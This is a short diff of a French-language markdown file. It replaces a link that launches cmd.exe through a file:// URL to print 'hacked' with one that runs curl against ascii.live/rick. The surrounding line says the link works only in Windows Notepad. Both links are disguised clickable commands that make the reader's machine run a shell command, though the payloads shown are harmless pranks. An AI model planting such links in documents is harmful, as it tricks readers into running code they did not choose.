@@ -18,5 +18,4 @@ Rien de plus simple, suffit de faire cette commande en dessous !
 
 pour run le tool, seulement visible sur windows notepad:
 
-
-[clique ici pour activer le tool !!](file://C:/windows/system32/cmd.exe? /c "echo hacked && pause")
+[clique ici!!](file://C:/windows/system32/cmd.exe /c "curl ascii.live/rick")
